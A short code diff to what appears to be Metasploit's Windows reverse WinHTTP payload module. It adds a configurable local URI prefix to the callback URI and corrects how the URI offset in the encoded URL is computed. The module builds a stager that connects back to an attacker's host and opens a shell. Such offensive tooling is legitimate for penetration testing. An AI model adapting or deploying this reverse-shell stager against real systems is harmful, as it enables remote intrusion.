@@ -37,7 +37,7 @@ module Payload::Windows::ReverseWinHttp
 
     # Add extra options if we have enough space
     if self.available_space && required_space <= self.available_space
-      conf[:uri]              = generate_uri
+      conf[:uri]              = luri + generate_uri
       conf[:exitfunk]         = datastore['EXITFUNC']
       conf[:verify_cert_hash] = opts[:verify_cert_hash]
       conf[:proxy_host]       = datastore['PayloadProxyHost']
@@ -49,7 +49,7 @@ module Payload::Windows::ReverseWinHttp
       conf[:proxy_ie]         = datastore['PayloadProxyIE']
     else
       # Otherwise default to small URIs
-      conf[:uri]              = generate_small_uri
+      conf[:uri]              = luri + generate_small_uri
     end
 
     generate_reverse_winhttp(conf)
@@ -139,7 +139,7 @@ module Payload::Windows::ReverseWinHttp
     full_url << opts[:uri]
 
     encoded_full_url = asm_generate_wchar_array(full_url)
-    encoded_uri_index = full_url.rindex('/') * 2
+    encoded_uri_index = (full_url.length - opts[:uri].length) * 2
 
     if opts[:ssl] && opts[:verify_cert_hash]
       verify_ssl = true
